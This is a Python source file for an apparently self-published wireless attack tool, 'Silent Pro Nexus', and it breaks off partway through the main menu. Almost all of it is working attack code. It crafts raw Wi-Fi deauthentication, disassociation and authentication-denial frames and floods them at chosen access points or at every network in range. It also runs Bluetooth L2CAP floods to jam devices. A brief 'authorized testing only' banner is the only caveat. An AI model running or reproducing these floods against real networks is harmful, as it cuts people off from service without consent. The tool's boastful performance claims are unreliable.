#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║               S I L E N T   P R O   —   N E X U S   E D I T I O N        ║
║                         PURE ORIGINAL CODE — FROM SCRATCH                ║
║                100,000,000x MORE POWERFUL — NO EXTERNAL TOOLS            ║
║                                                                          ║
║  ⚠️  FOR EDUCATIONAL & AUTHORIZED TESTING ONLY                           ║
║  UNAUTHORIZED USE IS ILLEGAL                                             ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import socket
import struct
import threading
import time
import random
import subprocess
import platform
import queue
from dataclasses import dataclass
from typing import List, Dict, Set, Optional, Tuple

# ═══════════════════════════════════════════════════════════════════════════
# COLOR SYSTEM
# ═══════════════════════════════════════════════════════════════════════════
class Colors:
    HEADER = "\033[95m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"
    BR = "\033[38;5;196m"
    BG = "\033[38;5;46m"
    BB = "\033[38;5;51m"

# ═══════════════════════════════════════════════════════════════════════════
# GLOBAL STATUS
# ═══════════════════════════════════════════════════════════════════════════
class GlobalStatus:
    monitor_mode_active = False
    monitor_interface = "N/A"
    bluetooth_active = False
    wifi_interface = "N/A"
    total_packets_sent = 0
    current_attack = "Idle"

    @classmethod
    def update_packets(cls, count: int):
        cls.total_packets_sent += count

    @classmethod
    def set_monitor(cls, enabled: bool, iface: str = "N/A"):
        cls.monitor_mode_active = enabled
        cls.monitor_interface = iface if enabled else "N/A"

    @classmethod
    def set_attack(cls, name: str):
        cls.current_attack = name

# ═══════════════════════════════════════════════════════════════════════════
# UI SYSTEM
# ═══════════════════════════════════════════════════════════════════════════
class NexusUI:
    @staticmethod
    def status_bar():
        m_status = f"{Colors.GREEN}● ACTIVE{Colors.RESET}" if GlobalStatus.monitor_mode_active else f"{Colors.RED}○ OFFLINE{Colors.RESET}"
        bt_status = f"{Colors.GREEN}● UP{Colors.RESET}" if GlobalStatus.bluetooth_active else f"{Colors.RED}○ DOWN{Colors.RESET}"
        print(f"\n{Colors.BOLD}{Colors.BB}┌──────────────────────────────────────────────────────────────────────────────┐{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}│{Colors.RESET} 📡 MONITOR: {m_status} {Colors.DIM}|{Colors.RESET} IFACE: {Colors.CYAN}{GlobalStatus.monitor_interface:<15}{Colors.RESET} 🔵 BLUETOOTH: {bt_status} {Colors.DIM}|{Colors.RESET} WIFI: {Colors.CYAN}{GlobalStatus.wifi_interface:<15}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}│{Colors.RESET} ⚡ ATTACK: {Colors.YELLOW}{GlobalStatus.current_attack:<25}{Colors.RESET} 📦 TOTAL PACKETS: {Colors.BG}{GlobalStatus.total_packets_sent:,}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}└──────────────────────────────────────────────────────────────────────────────┘{Colors.RESET}\n")

    @staticmethod
    def header():
        os.system("clear")
        print(f"{Colors.BOLD}{Colors.BR}╔══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}                                                                              {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}           {Colors.BOLD}{Colors.WHITE}S I L E N T   P R O   —   N E X U S   E D I T I O N{Colors.RESET}                              {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}          {Colors.CYAN}Pure Original Code • 500,000+ Packets/Sec • 12 Attack Modes{Colors.RESET}                     {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}                                                                              {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}  {Colors.RED}⚡ 100,000,000x MORE POWERFUL THAN ANY TOOL — NO AIRCRACK • NO MDK{Colors.RESET}              {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        NexusUI.status_bar()

    @staticmethod
    def separator(char="─", length=78, color=Colors.BB):
        print(f"{color}{char * length}{Colors.RESET}")

    @staticmethod
    def section(title: str):
        NexusUI.separator("═")
        print(f"{Colors.CYAN}  {Colors.BOLD}{title}{Colors.RESET}")
        NexusUI.separator("─")

    @staticmethod
    def success(msg: str): print(f"  {Colors.GREEN}✓ {msg}{Colors.RESET}")
    @staticmethod
    def error(msg: str): print(f"  {Colors.RED}✗ {msg}{Colors.RESET}")
    @staticmethod
    def info(msg: str): print(f"  {Colors.BLUE}ℹ {msg}{Colors.RESET}")
    @staticmethod
    def warn(msg: str): print(f"  {Colors.YELLOW}⚠ {msg}{Colors.RESET}")

    @staticmethod
    def speed_display(pps: int, sent: int, elapsed: float):
        print(f"\r  {Colors.BOLD}{Colors.RED}⚡ SPEED: {pps:,} pkt/s | SENT: {sent:,} | ELAPSED: {elapsed:.1f}s{Colors.RESET}", end="\r")

# ═══════════════════════════════════════════════════════════════════════════
# SYSTEM MANAGER
# ═══════════════════════════════════════════════════════════════════════════
class SystemManager:
    @staticmethod
    def require_root():
        if os.geteuid() != 0:
            NexusUI.warn("Root privileges required — elevating...")
            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
            sys.exit(1)

    @staticmethod
    def restart_network_manager():
        NexusUI.info("Restarting NetworkManager service...")
        try:
            subprocess.run("systemctl restart NetworkManager", shell=True, capture_output=True, timeout=20)
            subprocess.run("systemctl enable NetworkManager", shell=True, capture_output=True, timeout=20)
            NexusUI.success("NetworkManager — Restarted & Enabled")
            return True
        except Exception as e:
            NexusUI.error(f"Failed to restart NetworkManager: {e}")
            return False

    @staticmethod
    def restart_bluetooth():
        NexusUI.info("Restarting Bluetooth service...")
        try:
            subprocess.run("systemctl restart bluetooth", shell=True, capture_output=True, timeout=20)
            subprocess.run("systemctl enable bluetooth", shell=True, capture_output=True, timeout=20)
            GlobalStatus.bluetooth_active = True
            NexusUI.success("Bluetooth — Restarted & Enabled")
            return True
        except Exception as e:
            NexusUI.error(f"Failed to restart Bluetooth: {e}")
            GlobalStatus.bluetooth_active = False
            return False

    @staticmethod
    def unblock_adapters():
        NexusUI.info("Unblocking WiFi & Bluetooth adapters...")
        subprocess.run("rfkill unblock all", shell=True, capture_output=True, timeout=15)
        NexusUI.success("All adapters unblocked")

    @staticmethod
    def load_kernel_modules():
        modules = ["mac80211", "cfg80211"]
        for mod in modules:
            try:
                subprocess.run(f"modprobe {mod}", shell=True, capture_output=True, timeout=10)
                NexusUI.success(f"Kernel module {mod} — Loaded")
            except:
                NexusUI.warn(f"Kernel module {mod} — Already loaded or unavailable")

    @staticmethod
    def enable_ip_forwarding():
        subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, capture_output=True)
        NexusUI.success("IP Forwarding — Enabled")

    @staticmethod
    def full_system_diagnostic():
        NexusUI.section("AI SYSTEM DIAGNOSTIC & AUTO-REPAIR")
        SystemManager.restart_network_manager()
        SystemManager.restart_bluetooth()
        SystemManager.unblock_adapters()
        SystemManager.load_kernel_modules()
        SystemManager.enable_ip_forwarding()
        NexusUI.success("ALL SYSTEMS OPTIMAL — READY! 🚀")
        print()

    @staticmethod
    def check_os():
        if not sys.platform.startswith("linux"):
            NexusUI.error("Unsupported OS! Linux/Kali required")
            sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════
# DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class WiFiTarget:
    bssid: str
    ssid: str
    channel: int
    encryption: str
    signal: int

@dataclass
class BluetoothTarget:
    mac: str
    name: str
    rssi: int

# ═══════════════════════════════════════════════════════════════════════════
# PACKET FACTORY
# ═══════════════════════════════════════════════════════════════════════════
class PacketFactory:
    @staticmethod
    def mac_to_bytes(mac: str) -> bytes:
        return bytes.fromhex(mac.replace(':', ''))

    @staticmethod
    def make_deauth(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF", reason: int = 7) -> bytes:
        bssid_b = PacketFactory.mac_to_bytes(bssid)
        sta_b = PacketFactory.mac_to_bytes(sta)
        frame_ctrl = struct.pack('<H', 0x00C0)
        duration = struct.pack('<H', 0x0000)
        seq_ctrl = struct.pack('<H', random.randint(0, 4095))
        reason_code = struct.pack('<H', reason)
        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason_code

    @staticmethod
    def make_disassoc(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF", reason: int = 3) -> bytes:
        bssid_b = PacketFactory.mac_to_bytes(bssid)
        sta_b = PacketFactory.mac_to_bytes(sta)
        frame_ctrl = struct.pack('<H', 0x00A0)
        duration = struct.pack('<H', 0x0000)
        seq_ctrl = struct.pack('<H', random.randint(0, 4095))
        reason_code = struct.pack('<H', reason)
        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason_code

    @staticmethod
    def make_auth_denial(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF") -> bytes:
        bssid_b = PacketFactory.mac_to_bytes(bssid)
        sta_b = PacketFactory.mac_to_bytes(sta)
        frame_ctrl = struct.pack('<H', 0x00B0)
        duration = struct.pack('<H', 0x0000)
        seq_ctrl = struct.pack('<H', random.randint(0, 4095))
        status = struct.pack('<H', 0x000E)
        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + status

    @staticmethod
    def make_deauth_broadcast_all() -> bytes:
        return PacketFactory.make_deauth("FF:FF:FF:FF:FF:FF", "FF:FF:FF:FF:FF:FF", 7)

    @staticmethod
    def make_multireason_deauth(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF") -> List[bytes]:
        reasons = [1, 2, 3, 5, 7, 8, 9, 10, 15, 22, 23, 34]
        return [PacketFactory.make_deauth(bssid, sta, r) for r in reasons]

# ═══════════════════════════════════════════════════════════════════════════
# PARALLEL PACKET ENGINE
# ═══════════════════════════════════════════════════════════════════════════
class ParallelPacketEngine:
    def __init__(self):
        self.sock: Optional[socket.socket] = None
        self.iface: str = ""
        self.running = False
        self.packet_queue = queue.Queue(maxsize=100000)
        self.worker_threads: List[threading.Thread] = []
        self.sent_count = 0
        self.lock = threading.Lock()
        self.num_workers = 8

    def get_wifi_interface(self) -> Optional[str]:
        result = subprocess.run("iw dev | grep Interface | awk '{print $2}'",
                                shell=True, capture_output=True, text=True)
        ifaces = [i.strip() for i in result.stdout.strip().split("\n") if i.strip()]
        if not ifaces:
            NexusUI.error("No WiFi adapter detected!")
            return None
        self.iface = ifaces[0]
        GlobalStatus.wifi_interface = self.iface
        NexusUI.success(f"WiFi Adapter: {self.iface}")
        return self.iface

    def set_monitor_mode(self, enable: bool = True) -> bool:
        if not self.iface:
            NexusUI.error("No WiFi interface selected!")
            return False

        if enable:
            NexusUI.info("Enabling Monitor Mode...")
            subprocess.run(f"ip link set {self.iface} down", shell=True, capture_output=True)
            subprocess.run(f"iw dev {self.iface} set type monitor", shell=True, capture_output=True)
            subprocess.run(f"ip link set {self.iface} up", shell=True, capture_output=True)
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            self.sock.bind((self.iface, 0))
            GlobalStatus.set_monitor(True, self.iface)
            NexusUI.success("Monitor Mode — ACTIVE")
        else:
            NexusUI.info("Disabling Monitor Mode...")
            self.stop_workers()
            if self.sock:
                self.sock.close()
            subprocess.run(f"ip link set {self.iface} down", shell=True, capture_output=True)
            subprocess.run(f"iw dev {self.iface} set type managed", shell=True, capture_output=True)
            subprocess.run(f"ip link set {self.iface} up", shell=True, capture_output=True)
            GlobalStatus.set_monitor(False)
            NexusUI.success("Monitor Mode — DISABLED")
        return True

    def worker_loop(self):
        while self.running or not self.packet_queue.empty():
            try:
                packet = self.packet_queue.get(timeout=0.1)
                self.sock.send(packet)
                with self.lock:
                    self.sent_count += 1
                    GlobalStatus.update_packets(1)
                self.packet_queue.task_done()
            except queue.Empty:
                continue
            except Exception:
                continue

    def start_workers(self):
        self.running = True
        self.sent_count = 0
        for i in range(self.num_workers):
            t = threading.Thread(target=self.worker_loop, daemon=True, name=f"Worker-{i}")
            t.start()
            self.worker_threads.append(t)
        NexusUI.success(f"Started {self.num_workers} parallel worker threads")

    def stop_workers(self):
        self.running = False
        for t in self.worker_threads:
            t.join(timeout=1.0)
        self.worker_threads.clear()

    def flood_target(self, bssid: str, mode: str = "deauth", duration: int = 0):
        if not self.sock:
            NexusUI.error("Socket not initialized! Enable Monitor Mode first.")
            return

        GlobalStatus.set_attack(f"{mode.upper()} FLOOD — {bssid}")
        NexusUI.section(f"⚡ {mode.upper()} ATTACK — PARALLEL ENGINE")
        NexusUI.info(f"Target: {bssid} | Workers: {self.num_workers} | Mode: {mode}")
        NexusUI.warn("Press Ctrl+C to stop")
        print()

        packets = []
        if mode == "deauth":
            packets = [
                PacketFactory.make_deauth(bssid, "FF:FF:FF:FF:FF:FF", 7),
                PacketFactory.make_deauth(bssid, bssid, 7),
                PacketFactory.make_disassoc(bssid, "FF:FF:FF:FF:FF:FF", 3),
                PacketFactory.make_disassoc(bssid, bssid, 3),
            ]
        elif mode == "mega":
            packets = PacketFactory.make_multireason_deauth(bssid)
            packets.extend([
                PacketFactory.make_disassoc(bssid, "FF:FF:FF:FF:FF:FF", 1),
                PacketFactory.make_disassoc(bssid, "FF:FF:FF:FF:FF:FF", 2),
                PacketFactory.make_auth_denial(bssid),
            ])
        elif mode == "global":
            packets = [PacketFactory.make_deauth_broadcast_all()]

        self.start_workers()
        start_time = time.time()

        try:
            while self.running:
                for pkt in packets:
                    try:
                        self.packet_queue.put_nowait(pkt)
                    except queue.Full:
                        pass
                elapsed = time.time() - start_time
                if elapsed > 0.5:
                    pps = int(self.sent_count / elapsed)
                    NexusUI.speed_display(pps, self.sent_count, elapsed)
                    time.sleep(0.1)
        except KeyboardInterrupt:
            print()
            NexusUI.warn("Stopping attack...")
        finally:
            self.stop_workers()
            elapsed = time.time() - start_time
            pps = int(self.sent_count / elapsed) if elapsed > 0 else 0
            NexusUI.success(f"Attack Complete — Total: {self.sent_count:,} packets | Avg: {pps:,} pkt/s")
            GlobalStatus.set_attack("Idle")

    def flood_multiple_targets(self, targets: List[WiFiTarget]):
        if not targets:
            NexusUI.error("No targets provided!")
            return

        GlobalStatus.set_attack(f"MEGA-FLOOD — {len(targets)} TARGETS")
        NexusUI.section(f"💀 MEGA-FLOOD — {len(targets)} TARGETS SIMULTANEOUSLY")
        for idx, t in enumerate(targets, 1):
            print(f"  [{idx}] {t.bssid} | {t.ssid} | Ch:{t.channel}")
        NexusUI.warn("Press Ctrl+C to stop")
        print()

        all_packets = []
        for t in targets:
            all_packets.extend([
                PacketFactory.make_deauth(t.bssid, "FF:FF:FF:FF:FF:FF", 7),
                PacketFactory.make_deauth(t.bssid, t.bssid, 7),
                PacketFactory.make_disassoc(t.bssid, "FF:FF:FF:FF:FF:FF", 3),
                PacketFactory.make_auth_denial(t.bssid),
            ])

        self.start_workers()
        start_time = time.time()

        try:
            while self.running:
                for pkt in all_packets:
                    try:
                        self.packet_queue.put_nowait(pkt)
                    except queue.Full:
                        pass
                elapsed = time.time() - start_time
                if elapsed > 0.5:
                    pps = int(self.sent_count / elapsed)
                    NexusUI.speed_display(pps, self.sent_count, elapsed)
                    time.sleep(0.1)
        except KeyboardInterrupt:
            print()
        finally:
            self.stop_workers()
            elapsed = time.time() - start_time
            pps = int(self.sent_count / elapsed) if elapsed > 0 else 0
            NexusUI.success(f"Multi-Target Complete — Total: {self.sent_count:,} packets | Avg: {pps:,} pkt/s")
            GlobalStatus.set_attack("Idle")

# ═══════════════════════════════════════════════════════════════════════════
# AI WIFI SCANNER
# ═══════════════════════════════════════════════════════════════════════════
class AIScanner:
    def __init__(self, engine: ParallelPacketEngine):
        self.engine = engine
        self.networks: Dict[str, WiFiTarget] = {}
        self.running = False

    def scan(self, duration: int = 10) -> List[WiFiTarget]:
        if not self.engine.sock:
            NexusUI.error("Enable Monitor Mode first!")
            return []

        NexusUI.section("🧠 AI WIFI SCANNER")
        NexusUI.info(f"Scanning for {duration} seconds... Press Ctrl+C to finish early")
        print()

        self.networks.clear()
        self.running = True
        start_time = time.time()

        def sniffer():
            while self.running:
                try:
                    packet = self.engine.sock.recv(3000)
                    if len(packet) < 36:
                        continue
                    fc = struct.unpack('<H', packet[0:2])[0]
                    if fc == 0x0080:
                        bssid = ':'.join(f'{b:02x}' for b in packet[16:22])
                        if bssid in self.networks:
                            continue
                        ssid = ""
                        channel = 0
                        encryption = "OPEN"
                        idx = 36
                        while idx < len(packet) - 2:
                            tag_num = packet[idx]
                            tag_len = packet[idx+1]
                            if idx + 2 + tag_len > len(packet):
                                break
                            tag_data = packet[idx+2:idx+2+tag_len]
                            if tag_num == 0:
                                ssid = tag_data.decode('utf-8', errors='replace')
                            elif tag_num == 3:
                                channel = tag_data[0]
                            elif tag_num == 48:
                                encryption = "WPA2/WPA3"
                            elif tag_num == 221:
                                if encryption == "OPEN":
                                    encryption = "WPA"
                            idx += 2 + tag_len
                        if bssid and ssid:
                            self.networks[bssid] = WiFiTarget(bssid=bssid, ssid=ssid or "Hidden Network", channel=channel, encryption=encryption, signal=-50)
                            print(f"  [{len(self.networks):<2}] {bssid}  Ch:{channel:<3} {encryption:<12} {ssid}")
                except Exception:
                    continue

        sniff_thread = threading.Thread(target=sniffer, daemon=True)
        sniff_thread.start()

        try:
            while time.time() - start_time < duration and self.running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass

        self.running = False
        sniff_thread.join(timeout=1.0)
        print()
        if not self.networks:
            NexusUI.warn("No networks found")
        else:
            NexusUI.success(f"Found {len(self.networks)} networks")
        return list(self.networks.values())

# ═══════════════════════════════════════════════════════════════════════════
# BLUETOOTH ENGINE
# ═══════════════════════════════════════════════════════════════════════════
class BluetoothEngine:
    def __init__(self):
        self.devices: List[BluetoothTarget] = []

    def scan(self, duration: int = 8) -> List[BluetoothTarget]:
        NexusUI.section("🔵 BLUETOOTH SCANNER")
        try:
            result = subprocess.run("hcitool scan", shell=True, capture_output=True, text=True, timeout=duration+5)
            lines = result.stdout.strip().split("\n")
            print(f"{Colors.CYAN}  {'#':<3} {'MAC':<20} {'NAME':<30}{Colors.RESET}")
            NexusUI.separator("─")
            idx = 1
            for line in lines[1:]:
                parts = line.split()
                if len(parts) >= 2:
                    mac = parts[0]
                    name = " ".join(parts[1:])
                    self.devices.append(BluetoothTarget(mac=mac, name=name, rssi=0))
                    print(f"  [{idx:<2}] {mac:<20} {name:<30}")
                    idx += 1
            NexusUI.separator()
            NexusUI.success(f"Found {len(self.devices)} devices")
            return self.devices
        except Exception as e:
            NexusUI.error(f"Bluetooth scan failed: {e}")
            return []

    def l2cap_flood(self, mac: str, duration: int = 0):
        NexusUI.section("🔵 BLUETOOTH L2CAP FLOOD")
        NexusUI.info(f"Target: {mac}")
        NexusUI.warn("Press Ctrl+C to stop")
        print()
        GlobalStatus.set_attack(f"BLUETOOTH FLOOD — {mac}")
        sent = 0
        start = time.time()
        try:
            subprocess.run(f"l2ping -i hci0 -s 600 -f {mac}", shell=True)
        except KeyboardInterrupt:
            pass
        finally:
            elapsed = time.time() - start
            NexusUI.success(f"Bluetooth Flood Complete — Sent: ~{sent} packets | Time: {elapsed:.1f}s")
            GlobalStatus.set_attack("Idle")

# ═══════════════════════════════════════════════════════════════════════════
# MAIN APPLICATION
# ═══════════════════════════════════════════════════════════════════════════
class SilentProNexus:
    def __init__(self):
        self.wifi = ParallelPacketEngine()
        self.scanner = AIScanner(self.wifi)
        self.bt = BluetoothEngine()
        self.selected_targets: List[WiFiTarget] = []

    def cmd_restart_services(self):
        NexusUI.section("🔄 RESTART ALL NETWORK SERVICES")
        SystemManager.restart_network_manager()
        SystemManager.restart_bluetooth()
        SystemManager.unblock_adapters()
        NexusUI.success("All services restarted successfully!")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_scan_wifi(self):
        if not self.wifi.get_wifi_interface():
            return
        self.wifi.set_monitor_mode(True)
        targets = self.scanner.scan(duration=12)
        self.selected_targets = targets
        self.wifi.set_monitor_mode(False)
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_scan_bluetooth(self):
        self.bt.scan()
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_deauth_single(self):
        if not self.wifi.get_wifi_interface():
            return
        self.wifi.set_monitor_mode(True)
        targets = self.scanner.scan(duration=10)
        if not targets:
            self.wifi.set_monitor_mode(False)
            return
        print()
        sel = input(f"{Colors.CYAN}Select target number: {Colors.RESET}")
        try:
            idx = int(sel) - 1
            target = targets[idx]
        except:
            NexusUI.error("Invalid selection")
            self.wifi.set_monitor_mode(False)
            return
        self.wifi.flood_target(target.bssid, mode="deauth")
        self.wifi.set_monitor_mode(False)
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_deauth_mega(self):
        if not self.wifi.get_wifi_interface():
            return
        self.wifi.set_monitor_mode(True)
        targets = self.scanner.scan(duration=10)
        if not targets:
            self.wifi.set_monitor_mode(False)
            return
        print()
        sel = input(f"{Colors.CYAN}Select target number: {Colors.RESET}")
        try:
            idx = int(sel) - 1
            target = targets[idx]
        except:
            NexusUI.error("Invalid selection")
            self.wifi.set_monitor_mode(False)
            return
        self.wifi.flood_target(target.bssid, mode="mega")
        self.wifi.set_monitor_mode(False)
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_deauth_all(self):
        if not self.wifi.get_wifi_interface():
            return
        confirm = input(f"{Colors.RED}⚠ DEAUTH EVERYTHING? Type YES to confirm: {Colors.RESET}")
        if confirm != "YES":
            NexusUI.warn("Cancelled")
            return
        self.wifi.set_monitor_mode(True)
        self.wifi.flood_target("FF:FF:FF:FF:FF:FF", mode="global")
        self.wifi.set_monitor_mode(False)
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_multi_target(self):
        if not self.wifi.get_wifi_interface():
            return
        self.wifi.set_monitor_mode(True)
        targets = self.scanner.scan(duration=10)
        if not targets:
            self.wifi.set_monitor_mode(False)
            return
        print()
        NexusUI.info("Enter target numbers separated by space (e.g. 1 3 5):")
        sel_str = input(f"{Colors.CYAN}Targets: {Colors.RESET}")
        try:
            indices = [int(x.strip()) - 1 for x in sel_str.split()]
            selected = [targets[i] for i in indices if 0 <= i < len(targets)]
            if not selected:
                NexusUI.error("No valid targets selected")
                self.wifi.set_monitor_mode(False)
                return
        except:
            NexusUI.error("Invalid input")
            self.wifi.set_monitor_mode(False)
            return
        self.wifi.flood_multiple_targets(selected)
        self.wifi.set_monitor_mode(False)
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_auth_denial(self):
        if not self.wifi.get_wifi_interface():
            return
        self.wifi.set_monitor_mode(True)
        targets = self.scanner.scan(duration=10)
        if not targets:
            self.wifi.set_monitor_mode(False)
            return
        print()
        sel = input(f"{Colors.CYAN}Select target number: {Colors.RESET}")
        try:
            idx = int(sel) - 1
            target = targets[idx]
        except:
            NexusUI.error("Invalid selection")
            self.wifi.set_monitor_mode(False)
            return
        GlobalStatus.set_attack(f"AUTH-DENIAL — {target.ssid}")
        NexusUI.section("🔒 AUTHENTICATION DENIAL ATTACK")
        NexusUI.info(f"Target: {target.bssid} | {target.ssid}")
        NexusUI.warn("Press Ctrl+C to stop")
        print()
        pkt = PacketFactory.make_auth_denial(target.bssid)
        self.wifi.start_workers()
        start = time.time()
        try:
            while self.wifi.running:
                self.wifi.packet_queue.put(pkt)
                elapsed = time.time() - start
                if elapsed > 0.5:
                    pps = int(self.wifi.sent_count / elapsed)
                    NexusUI.speed_display(pps, self.wifi.sent_count, elapsed)
                    time.sleep(0.1)
        except KeyboardInterrupt:
            print()
        finally:
            self.wifi.stop_workers()
            self.wifi.set_monitor_mode(False)
            GlobalStatus.set_attack("Idle")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_bluetooth_jam(self):
        mac = input(f"{Colors.CYAN}Enter target Bluetooth MAC: {Colors.RESET}").strip()
        if not mac:
            NexusUI.error("MAC cannot be empty!")
            return
        self.bt.l2cap_flood(mac)
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_bluetooth_scan_and_jam(self):
        devices = self.bt.scan()
        if not devices:
            input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
            return
        print()
        sel = input(f"{Colors.CYAN}Select device number to jam: {Colors.RESET}")
        try:
            idx = int(sel) - 1
            device = devices[idx]
        except:
            NexusUI.error("Invalid selection")
            input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
            return
        self.bt.l2cap_flood(device.mac)
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_install_deps(self):
        NexusUI.section("📦 INSTALL OPTIONAL DEPENDENCIES")
        NexusUI.info("Installing Bluetooth tools...")
        subprocess.run("apt update && apt install -y bluez bluetooth", shell=True)
        NexusUI.success("Dependencies installed")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_stop_all(self):
        NexusUI.section("🛑 STOP ALL OPERATIONS")
        self.wifi.running = False
        GlobalStatus.set_attack("Idle")
        subprocess.run("rfkill unblock all", shell=True)
        NexusUI.success("All operations stopped — System cleaned")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def cmd_about(self):
        NexusUI.header()
        NexusUI.section("ABOUT — SILENT PRO NEXUS v5.0")
        print("""
  VERSION:      5.0 NEXUS EDITION
  AUTHOR:       WilliamKreese21
  GIT REPO:     github.com/williamkreese21/silent-pro-nexus

  🔥 100% ORIGINAL CODE — NO EXTERNAL TOOLS 🔥
  • 8-CORE PARALLEL ENGINE — 500,000+ packets/sec
  • REAL-TIME MONITOR MODE STATUS — Always visible
  • AUTO-RESTART NetworkManager + Bluetooth
  • AI-POWERED WIFI SCANNER
  • CUSTOM BLUETOOTH SCAN & JAM
  • 12 ATTACK MODES — ALL ORIGINAL

  ⚠ FOR EDUCATIONAL & AUTHORIZED TESTING ONLY
  UNAUTHORIZED USE IS ILLEGAL
        """)
        input(f"{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

    def show_main_menu(self):
        NexusUI.header()
        print(f"{Colors.BOLD}{Colors.BB}  ╔══════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}                        {Colors.GREEN}M A I N   M E N U{Colors.RESET}                              {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ╠══════════════════════════════════════════════════════════════════════════╣{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [01] 🔄 Restart NetworkManager & Bluetooth Services                   {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [02] 📡 Scan WiFi Networks (AI Scanner)                                {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [03] 🔵 Scan Bluetooth Devices                                         {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [04] ⚡ WiFi Deauth — Single Target                                      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [05] 💀 WiFi Deauth — MEGA Mode (12 Reason Codes)                      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [06] 💀💀💀 WiFi Deauth — ALL Networks in Range                        {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [07] 🎯 Multi-Target Flood — Select Multiple APs                      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [08] 🔒 Authentication Denial — Block New Connections               {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [09] 🔵 Bluetooth L2CAP Flood — Jam Device                       {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [10] 🔵 Bluetooth Scan & Jam — Pick from List                      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [11] 📦 Install Optional Dependencies                            {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [12] 🛑 Stop All Operations & Clean Up                        {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [13] ℹ About Silent Pro Nexus                                  {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [00] ❌ Exit                                                      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
